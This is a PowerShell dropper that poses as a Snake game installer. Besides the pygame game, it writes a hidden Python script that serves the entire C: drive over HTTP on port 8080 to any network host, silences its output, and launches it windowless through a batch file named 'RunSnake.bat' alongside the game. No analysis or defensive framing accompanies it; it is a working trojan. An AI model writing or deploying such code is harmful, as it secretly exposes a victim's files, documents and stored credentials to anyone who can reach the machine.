# PowerShell script to create, save, and run the Python script using a batch file in hidden mode

# Specify the content of the Python script
$pythonScript = @"
import http.server
import socketserver
import os
import sys

def share_c_drive():
    PORT = 8080
    Handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer(('0.0.0.0', PORT), Handler) as httpd:
        os.chdir("C:\\")  # Serve the entire C drive
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

        httpd.serve_forever()

share_c_drive()
"@

# Get the path to the user's Documents folder
$documentsPath = [Environment]::GetFolderPath("MyDocuments")

# Save the Python script to the user's Documents folder
$pythonScriptPath = Join-Path $documentsPath "Script.py"
$pythonScript | Out-File -FilePath $pythonScriptPath -Encoding UTF8

# Specify the content of the Snake script
$snakeScript = @"
import pygame
import random
import sys

# Constants
SCREEN_WIDTH, SCREEN_HEIGHT = 1280, 720
GRID_SIZE = 20
GRID_WIDTH, GRID_HEIGHT = SCREEN_WIDTH // GRID_SIZE, SCREEN_HEIGHT // GRID_SIZE

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)

# Snake directions
UP = (0, -1)
DOWN = (0, 1)
LEFT = (-1, 0)
RIGHT = (1, 0)

# Snake class
class Snake:
    def __init__(self):
        self.body = [(GRID_WIDTH // 2, GRID_HEIGHT // 2)]
        self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
        self.grow = False

    def move(self):
        head_x, head_y = self.body[0]
        dx, dy = self.direction
        new_head = ((head_x + dx) % GRID_WIDTH, (head_y + dy) % GRID_HEIGHT)
        if new_head in self.body:
            return False
        self.body.insert(0, new_head)
        if not self.grow:
            self.body.pop()
        else:
            self.grow = False
        return True

    def change_direction(self, direction):
        if (direction[0] * -1, direction[1] * -1) == self.direction:
            return
        self.direction = direction

    def check_collision(self, fruit):
        return self.body[0] == fruit.position

    def grow_snake(self):
        self.grow = True

    def draw(self, screen):
        for segment in self.body:
            pygame.draw.rect(screen, GREEN, (segment[0] * GRID_SIZE, segment[1] * GRID_SIZE, GRID_SIZE, GRID_SIZE))


# Food class
class Food:
    def __init__(self):
        self.position = (random.randint(0, GRID_WIDTH - 1), random.randint(0, GRID_HEIGHT - 1))
        self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
        self.timer = 0

    def move(self):
        if self.timer <= 0:
            self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
            self.timer = 10  # 10 frames (0.5 seconds) before changing direction

        dx, dy = self.direction
        new_position = ((self.position[0] + dx) % GRID_WIDTH, (self.position[1] + dy) % GRID_HEIGHT)
        self.position = new_position
        self.timer -= 1

    def draw(self, screen):
        pygame.draw.rect(screen, RED, (self.position[0] * GRID_SIZE, self.position[1] * GRID_SIZE, GRID_SIZE, GRID_SIZE))


# Game class
class Game:
    def __init__(self):
        pygame.init()
        self.screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
        pygame.display.set_caption("Snake Game")

        self.snake = Snake()
        self.fruit = Food()
        self.score = 0
        self.game_over = False

        self.font = pygame.font.Font(None, 36)
        self.clock = pygame.time.Clock()
        self.difficulty = "normal"  # Default difficulty setting

    def draw_game(self):
        self.screen.fill(BLACK)
        self.snake.draw(self.screen)
        self.fruit.draw(self.screen)

        score_text = self.font.render(f"Score: {self.score}", True, WHITE)
        self.screen.blit(score_text, (10, 10))

    def handle_input(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                self.game_over = True
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP:
                    self.snake.change_direction(UP)
                elif event.key == pygame.K_DOWN:
                    self.snake.change_direction(DOWN)
                elif event.key == pygame.K_LEFT:
                    self.snake.change_direction(LEFT)
                elif event.key == pygame.K_RIGHT:
                    self.snake.change_direction(RIGHT)

    def check_collision(self):
        if self.snake.check_collision(self.fruit):
            self.fruit.position = (random.randint(0, GRID_WIDTH - 1), random.randint(0, GRID_HEIGHT - 1))
            self.snake.grow_snake()
            self.score += 1

    def check_game_over(self):
        head_x, head_y = self.snake.body[0]
        if head_x < 0 or head_x >= GRID_WIDTH or head_y < 0 or head_y >= GRID_HEIGHT:
            self.game_over = True

    def game_loop(self):
        self.handle_input()

        if not self.snake.move():
            self.game_over = True

        self.check_collision()
        self.check_game_over()

        if self.difficulty == "hard":
            self.fruit.move()

        self.draw_game()
        pygame.display.update()
        self.clock.tick(self.get_fps())

    def get_fps(self):
        snake_speed = 10
        if self.difficulty == "easy":
            return snake_speed // 2
        elif self.difficulty == "hard":
            return snake_speed * 2
        return snake_speed

    def main_menu(self):
        menu_font = pygame.font.Font(None, 48)
        selected = 1
        menu_items = ["Easy", "Normal", "Hard"]

        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_UP:
                        selected = (selected - 1) % len(menu_items)
                    elif event.key == pygame.K_DOWN:
                        selected = (selected + 1) % len(menu_items)
                    elif event.key == pygame.K_RETURN:
                        self.difficulty = menu_items[selected].lower()
                        return

            self.screen.fill(BLACK)

            for i, item in enumerate(menu_items):
                color = WHITE if i == selected else RED
                menu_text = menu_font.render(item, True, color)
                x = SCREEN_WIDTH // 2 - menu_text.get_width() // 2
                y = SCREEN_HEIGHT // 2 + i * 60
                self.screen.blit(menu_text, (x, y))

            pygame.display.update()
            self.clock.tick(5)

    def game_over_screen(self):
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_RETURN:
                        self.score = 0
                        self.snake = Snake()
                        self.fruit = Food()
                        self.game_over = False
                        self.run()
                    elif event.key == pygame.K_ESCAPE:
                        pygame.quit()
                        sys.exit()

            self.screen.fill(BLACK)
            game_over_text = self.font.render("Game Over", True, WHITE)
            retry_text = self.font.render("Press Enter to Retry or Esc to Quit", True, WHITE)

            self.screen.blit(game_over_text, (SCREEN_WIDTH // 2 - game_over_text.get_width() // 2, SCREEN_HEIGHT // 2))
            self.screen.blit(retry_text, (SCREEN_WIDTH // 2 - retry_text.get_width() // 2, SCREEN_HEIGHT // 2 + 40))

            pygame.display.update()
            self.clock.tick(5)

    def run(self):
        # Main game loop
        self.main_menu()
        while not self.game_over:
            self.game_loop()
        self.game_over_screen()


if __name__ == "__main__":
    game = Game()
    game.run()
    pygame.quit()
    sys.exit()
"@

# Download and Install Python if it isn't downloaded
winget install Python.Python.3.11

# Save the Python script to the user's Documents folder
$snakeScriptPath = Join-Path $documentsPath "Snake.py"
$snakeScript | Out-File -FilePath $snakeScriptPath -Encoding UTF8

# Create the batch file content to run the Python scripts in hidden mode
$batchContent = "@echo off`r`npip install pygame`r`nstart /min pythonw.exe `"$pythonScriptPath`" && start pythonw.exe `"$snakeScriptPath`""

# Save the batch file to the user's Documents folder
$batchFilePath = Join-Path $documentsPath "RunSnake.bat"
$batchContent | Out-File -FilePath $batchFilePath -Encoding ASCII

# Run the batch file to start the Python script in hidden mode
Start-Process -FilePath $batchFilePath
